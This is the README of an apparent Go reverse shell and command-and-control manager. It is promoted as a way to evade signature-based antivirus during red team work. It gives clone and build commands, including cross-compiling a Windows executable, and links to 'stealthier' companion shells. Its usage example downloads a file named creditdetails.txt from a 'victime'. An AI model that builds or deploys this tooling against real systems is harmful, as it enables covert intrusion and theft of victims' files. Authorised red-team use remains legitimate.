# Reverseshell and manager in go lang
  
Will help to bypass signature based AV engines while doing red team engagements.
## Please check mask and shadow for more stealthy shells :)
### https://github.com/diljithishere/mask
### https://github.com/diljithishere/shadow

## Getting Started

git clone https://github.com/diljithishere/reversehellgo.git

cd reverseshellgo

go build manageShell.go

./manageShell

Build executable for reverseshell

**GOOS=windows GOARCH=386 go build -o new.exe reverseshell.go**


### Prerequisites

go 1.9

```
./manager
This will wait for the revershell to connect back once connected you can see >> prompt
If you want to download file from victime supply get command  
>> get creditdetails.txt
```
